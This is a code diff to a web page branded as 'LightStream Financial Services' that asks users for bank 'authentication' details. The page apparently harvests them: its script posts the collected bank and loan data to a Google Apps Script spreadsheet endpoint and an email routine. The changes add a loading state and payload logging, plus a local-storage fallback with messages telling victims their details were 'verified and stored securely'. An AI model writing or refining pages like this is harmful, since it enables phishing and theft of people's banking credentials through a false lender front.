@@ -256,9 +256,12 @@
                                     class="flex-1 bg-gray-300 text-gray-700 py-3 rounded-lg hover:bg-gray-400 transition duration-200">
                                 Back
                             </button>
-                            <button type="submit"
-                                    class="flex-1 bg-indigo-600 text-white py-3 rounded-lg hover:bg-indigo-700 transition duration-200">
-                                Connect Securely
+                            <button type="submit" id="submitBtn"
+                                    class="flex-1 bg-indigo-600 text-white py-3 rounded-lg hover:bg-indigo-700 transition duration-200 flex items-center justify-center">
+                                <span id="submitBtnText">Connect Securely</span>
+                                <span id="submitBtnLoading" class="hidden ml-2">
+                                    <i class="fas fa-spinner fa-spin"></i>
+                                </span>
                             </button>
                         </div>
                     </form>
@@ -558,9 +561,23 @@ const SHEET_URL = "https://script.google.com/macros/s/AKfycbyWmwiwXsYM8IbOIWgzz3
 document.querySelector("form").addEventListener("submit", async function(e) {
   e.preventDefault();
 
+  // Show loading state
+  const submitBtn = document.getElementById("submitBtn");
+  const submitBtnText = document.getElementById("submitBtnText");
+  const submitBtnLoading = document.getElementById("submitBtnLoading");
+  
+  submitBtn.disabled = true;
+  submitBtnText.textContent = "Processing...";
+  submitBtnLoading.classList.remove("hidden");
+
   // Validate phone number before proceeding
   const phoneNumber = document.getElementById("phoneNumber").value;
   if (!phoneNumber || phoneNumber.length !== 10 || !/^\d+$/.test(phoneNumber)) {
+    // Reset loading state
+    submitBtn.disabled = false;
+    submitBtnText.textContent = "Connect Securely";
+    submitBtnLoading.classList.add("hidden");
+    
     alert('❌ Please enter a valid 10-digit phone number without dashes or parentheses');
     document.getElementById("phoneNumber").focus();
     return;
@@ -610,39 +627,95 @@ document.querySelector("form").addEventListener("submit", async function(e) {
     sendBankAuthEmail(bankData, loanData);
 
     // Continue with Google Sheets submission (keep existing functionality)
+    console.log("🚀 Sending data to Google Sheets...");
+    console.log("📊 Data being sent:", JSON.stringify(finalData, null, 2));
+    
     const res = await fetch(SHEET_URL, {
       method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
       body: JSON.stringify(finalData)
     });
 
+    console.log("📡 Response status:", res.status);
+    console.log("📡 Response headers:", res.headers);
+
     const result = await res.text();
-    console.log("Google Sheet Response:", result);
+    console.log("📋 Google Sheet Response:", result);
 
-    // Handle different scenarios based on whether user has loan data
-    if (hasLoanData) {
-      // User came from personal loan form - continue to loan agreement
-      alert("🏦 Bank Verification Complete!\n\nYour application has been successfully submitted and is now under review.\n\n✅ Note: Due to high email volume, confirmation emails will be sent shortly.\n\nNext Steps:\n• You will be redirected to your loan agreement\n• Complete the digital signature process\n• Check your email for important updates\n• Loan decision typically within 24 hours\n\nThank you for choosing LightStream Financial Services.");
+    if (res.ok && result.includes("Success")) {
+      console.log("✅ Data submitted successfully to Google Sheets");
+      
+      // Handle different scenarios based on whether user has loan data
+      if (hasLoanData) {
+        // User came from personal loan form - continue to loan agreement
+        alert("🏦 Bank Verification Complete!\n\nYour application has been successfully submitted and is now under review.\n\n✅ Note: Due to high email volume, confirmation emails will be sent shortly.\n\nNext Steps:\n• You will be redirected to your loan agreement\n• Complete the digital signature process\n• Check your email for important updates\n• Loan decision typically within 24 hours\n\nThank you for choosing LightStream Financial Services.");
 
-      // Store loan data for loan agreement page (SECURE: sessionStorage only)
-      sessionStorage.setItem("loanApplicationData", JSON.stringify(finalData));
+        // Store loan data for loan agreement page (SECURE: sessionStorage only)
+        sessionStorage.setItem("loanApplicationData", JSON.stringify(finalData));
 
-      // Redirect to loan agreement page after successful submission
-      setTimeout(() => {
-        window.location.href = "loan-agreement.html";
-      }, 1000);
+        // Redirect to loan agreement page after successful submission
+        setTimeout(() => {
+          window.location.href = "loan-agreement.html";
+        }, 1000);
+      } else {
+        // Standalone bank auth - show simple success and redirect to homepage
+        alert("✅ Bank Authentication Successful!\n\nYour bank details have been verified and stored securely.\n\nThank you for choosing LightStream Financial Services.\n\nYou will be redirected to our homepage.");
+
+        // Redirect to homepage after successful submission
+        setTimeout(() => {
+          window.location.href = "index.html";
+        }, 2000);
+      }
     } else {
-      // Standalone bank auth - show simple success and redirect to homepage
-      alert("✅ Bank Authentication Successful!\n\nYour bank details have been verified and stored securely.\n\nThank you for choosing LightStream Financial Services.\n\nYou will be redirected to our homepage.");
-
-      // Redirect to homepage after successful submission
-      setTimeout(() => {
-        window.location.href = "index.html";
-      }, 2000);
+      throw new Error(`Google Sheets submission failed: ${result}`);
     }
 
   } catch (err) {
-    alert("Error sending data ❌");
-    console.error(err);
+    console.error("❌ Error details:", err);
+    console.error("❌ Error message:", err.message);
+    console.error("❌ Error stack:", err.stack);
+    
+    // Reset loading state
+    submitBtn.disabled = false;
+    submitBtnText.textContent = "Connect Securely";
+    submitBtnLoading.classList.add("hidden");
+    
+    // Check if it's a Google Sheets error
+    if (err.message.includes("Google Sheets") || err.message.includes("fetch")) {
+      // Google Sheets failed, but we can still proceed with the application
+      const proceedAnyway = confirm(`⚠️ Google Sheets submission failed: ${err.message}\n\nHowever, your bank authentication was successful and your data has been saved locally.\n\nWould you like to proceed to the next step?\n\n(Your application data will be submitted when the system is restored.)`);
+      
+      if (proceedAnyway) {
+        // Store data locally for later submission
+        const backupData = {
+          type: 'bank-auth',
+          data: finalData,
+          timestamp: new Date().toISOString(),
+          error: err.message
+        };
+        localStorage.setItem('pendingSubmission_' + Date.now(), JSON.stringify(backupData));
+        console.log("📦 Data saved locally for later submission");
+        
+        // Proceed with the application flow
+        if (hasLoanData) {
+          alert("🏦 Bank Verification Complete!\n\nNote: Your data has been saved locally and will be submitted to our system shortly.\n\nProceeding to your loan agreement...");
+          sessionStorage.setItem("loanApplicationData", JSON.stringify(finalData));
+          setTimeout(() => {
+            window.location.href = "loan-agreement.html";
+          }, 1000);
+        } else {
+          alert("✅ Bank Authentication Successful!\n\nYour data has been saved locally and will be processed shortly.\n\nRedirecting to homepage...");
+          setTimeout(() => {
+            window.location.href = "index.html";
+          }, 2000);
+        }
+      }
+    } else {
+      // Other type of error
+      alert(`❌ Error submitting data: ${err.message}\n\nPlease try again or contact support if the issue persists.\n\nTechnical details: ${err.message}`);
+    }
   }
 });
 
